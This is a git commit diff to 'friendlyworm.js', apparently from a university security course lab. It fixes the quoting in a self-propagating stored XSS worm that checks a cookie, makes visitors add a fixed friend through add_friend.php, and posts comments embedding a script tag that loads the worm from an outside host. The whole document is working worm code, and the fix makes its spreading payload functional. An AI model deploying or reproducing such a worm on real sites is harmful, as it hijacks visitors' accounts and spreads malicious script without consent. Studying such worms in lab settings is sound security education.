88d83676fe6196e1480ca6bb2f6fc41f5aa03e53
Daniel Lynch <54510633+drl3180@users.noreply.github.com>
2022-04-06 17:18:35 -0400

    Update friendlyworm.js

--- friendlyworm.js
+++ friendlyworm.js
@@ -10,7 +10,7 @@ if (cookie.get("hasCookie") != "true") {
      	 	request2.open("POST", `http://csec380-core.csec.rit.edu:86/add_friend.php?id=92`, true);
       		request2.send();
       		var request3 = new XMLHttpRequest();
-      		request3.open("POST", `/add_comment.php?id=${i}&comment=<script src=""http://people.rit.edu/drl3180/friendlyworm.js""></script>`, true);
+      		request3.open("POST", `/add_comment.php?id=${i}&comment=<script src="http://people.rit.edu/drl3180/friendlyworm.js"></script>`, true);
       		request3.send();
 	}
 }
